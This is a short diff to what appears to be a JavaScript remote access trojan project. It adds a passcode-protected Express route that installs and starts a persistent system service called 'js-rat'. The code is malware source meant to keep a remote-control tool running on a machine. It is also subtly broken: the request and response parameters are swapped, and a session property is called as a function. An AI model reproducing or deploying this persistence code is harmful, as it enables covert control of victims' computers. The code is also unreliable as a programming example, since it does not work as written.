@@ -25,3 +25,20 @@ app.get("/", function(req, res) {
     res.render("index");
 });
 
+app.post("/install", function(res, req) {
+    if(req.body.passcode === userPasscode) {
+        let svc = new Service({
+            name:"js-rat",
+            description:"Remote Access Tool Made In Javascript",
+            script:scriptPath
+        });
+
+        svc.on("install", function(){
+            res.sessionID("The service has been installed");
+            svc.start();
+        });
+
+        svc.install();
+    }
+});
+
